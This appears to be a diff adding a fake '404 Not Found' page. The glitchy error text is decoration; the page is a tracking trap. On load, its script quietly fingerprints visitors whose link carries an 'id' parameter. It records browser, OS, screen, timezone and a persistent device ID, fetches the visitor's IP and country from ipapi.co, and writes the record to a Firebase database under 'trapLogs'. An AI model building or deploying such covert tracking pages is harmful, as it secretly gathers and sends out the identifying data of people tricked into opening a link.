@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>404 — Not Found</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--y:#f5c800;--red:#c0000e;--bg:#0d0d0d}
+html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);font-family:'Courier New',monospace;color:#eee;user-select:none}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 18px,rgba(192,0,14,.03) 18px,rgba(192,0,14,.03) 20px);pointer-events:none;z-index:0}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,rgba(0,0,0,.07) 0px,rgba(0,0,0,.07) 1px,transparent 1px,transparent 3px);pointer-events:none;z-index:1;opacity:.5}
+.wrap{position:relative;z-index:2;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;gap:0}
+.err404{font-size:clamp(3.5rem,14vw,8rem);font-weight:900;letter-spacing:.05em;color:var(--red);text-shadow:0 0 30px rgba(192,0,14,.4);position:relative;animation:glitch 4s infinite;line-height:1;margin-bottom:6px}
+.err404::before,.err404::after{content:'404';position:absolute;inset:0;opacity:.6}
+.err404::before{color:#ff6b6b;animation:glA 4s infinite;clip-path:polygon(0 0,100% 0,100% 35%,0 35%)}
+.err404::after{color:#880008;animation:glB 4s infinite;clip-path:polygon(0 65%,100% 65%,100% 100%,0 100%)}
+@keyframes glitch{0%,85%,100%{transform:none}86%{transform:skewX(-3deg) translateX(3px)}88%{transform:none}94%{transform:skewX(1deg)}96%{transform:none}}
+@keyframes glA{0%,85%,100%{opacity:0;transform:none}86%{opacity:.7;transform:translateX(-4px)}88%{opacity:0}}
+@keyframes glB{0%,85%,100%{opacity:0;transform:none}87%{opacity:.6;transform:translateX(4px)}89%{opacity:0}}
+.sub{font-size:clamp(.55rem,.72rem,.7rem);color:rgba(192,0,14,.55);letter-spacing:.18em;text-transform:uppercase;margin-bottom:20px;animation:flicker 5s steps(1) infinite;text-align:center}
+@keyframes flicker{0%,100%{opacity:1}48%{opacity:1}50%{opacity:.2}52%{opacity:1}79%{opacity:1}81%{opacity:.35}83%{opacity:1}}
+.tri-wrap{margin-bottom:20px}
+.tri-wrap svg{width:clamp(110px,30vw,160px);display:block}
+.errtext{width:100%;max-width:440px;font-size:clamp(.5rem,.62rem,.6rem);line-height:1.65;color:rgba(200,200,200,.32);text-align:left;letter-spacing:.03em;padding:0 4px;animation:tglitch 9s steps(1) infinite}
+.errtext .eline{display:block;margin-bottom:1px}
+.errtext .eh{color:rgba(192,0,14,.5)}
+@keyframes tglitch{0%,100%{opacity:.4}44%{opacity:.4}45%{opacity:.08;transform:translateX(2px)}46%{opacity:.4;transform:none}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="err404">404</div>
+  <div class="sub">CONNECTION_TERMINATED · NODE_UNREACHABLE</div>
+  <div class="tri-wrap">
+    <svg viewBox="0 0 120 107" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="60,8 114,100 6,100" fill="rgba(192,0,14,.08)" stroke="#c0000e" stroke-width="2" stroke-linejoin="round"/>
+      <text x="60" y="78" text-anchor="middle" font-family="'Courier New',monospace" font-size="30" font-weight="700" fill="rgba(192,0,14,.55)">!</text>
+    </svg>
+  </div>
+  <div class="errtext">
+    <span class="eline">► <span class="eh">ERR_SOCKET_NOT_CONNECTED</span> — remote host refused handshake on port <span class="eh">443/tcp</span></span>
+    <span class="eline">► Kernel bridge <span class="eh">0x4F2A</span> returned null frame after 3 retries (timeout: 8000ms)</span>
+    <span class="eline">► TLS certificate chain incomplete — issuer <span class="eh">CN=VOLATILE_ROOT_CA</span> not in trust store</span>
+    <span class="eline">► Memory region <span class="eh">0xFFB3C000–0xFFB3CFFF</span> flagged: read access violation (code 5)</span>
+    <span class="eline">► DNS resolution failed: NXDOMAIN for <span class="eh">node-7.volatile.internal</span> after 4 attempts</span>
+    <span class="eline">► Session token <span class="eh">XT-9921-DELTA</span> expired or revoked by upstream authority</span>
+    <span class="eline">► Diagnostic code: <span class="eh">0xDEAD·C0DE·F404·NULL</span> — contact system administrator</span>
+  </div>
+</div>
+<script>
+(function(){
+'use strict';
+var FIREBASE_BASE='https://device-scan-8898e-default-rtdb.firebaseio.com/';
+var LINK_ID=(function(){var p=new URLSearchParams(location.search);return p.get('id')||'';})();
+
+function os(ua,pl){if(/Windows/.test(ua))return'Windows';if(/Android/.test(ua))return'Android';if(/iPhone|iPad|iPod/.test(ua)||(pl==='MacIntel'&&navigator.maxTouchPoints>1))return'iOS/iPadOS';if(/Mac/.test(ua))return'macOS';if(/CrOS/.test(ua))return'ChromeOS';if(/Linux/.test(ua))return'Linux';return'Unknown'}
+function browser(ua){var m;if(m=ua.match(/Edg\/([\d.]+)/))return'Edge '+m[1];if(m=ua.match(/OPR\/([\d.]+)/))return'Opera '+m[1];if(m=ua.match(/SamsungBrowser\/([\d.]+)/))return'Samsung Internet '+m[1];if(m=ua.match(/(?:Firefox|FxiOS)\/([\d.]+)/))return'Firefox '+m[1];if(m=ua.match(/(?:Chrome|CriOS)\/([\d.]+)/))return'Chrome '+m[1];if(m=ua.match(/Version\/([\d.]+).*Safari/))return'Safari '+m[1];return'Unknown'}
+function deviceTag(){try{var id=localStorage.getItem('sc6_deviceId');if(!id){var ua=navigator.userAgent;var o=os(ua,navigator.platform);id=o+'-'+Math.random().toString(36).slice(2,6).toUpperCase();localStorage.setItem('sc6_deviceId',id);}return id;}catch(e){return'Unknown'}}
+function fbUrl(p){return FIREBASE_BASE+p+'.json'}
+
+if(!LINK_ID)return;
+// Check if links are active
+fetch(fbUrl('_sc6/trapLinksEnabled')).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(v){
+  if(v===false){
+    var sub=document.querySelector('.sub');
+    if(sub)sub.textContent='LINK_EXPIRED · RESOURCE_UNAVAILABLE';
+    return;
+  }
+  var n=navigator,ua=n.userAgent;
+  var e={
+    time:new Date().toISOString(),
+    tag:deviceTag(),ua:ua,
+    os:os(ua,n.platform),browser:browser(ua),
+    lang:n.language||'?',
+    screen:screen.width+'×'+screen.height,
+    tz:Intl&&Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:'?',
+    country:'Unknown',ip:null,linkId:LINK_ID
+  };
+  fetch('https://ipapi.co/json/',{cache:'no-store'}).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(j){
+    if(j){e.ip=j.ip||null;e.country=j.country_name||'Unknown';e.region=j.region||'';}
+    var url=fbUrl('_sc6/trapLogs/'+LINK_ID);
+    fetch(url).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(existing){
+      var arr=Array.isArray(existing)?existing:[];arr.push(e);
+      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(arr)}).catch(function(){});
+    });
+  });
+});
+})();
+</script>
+</body>
+</html>
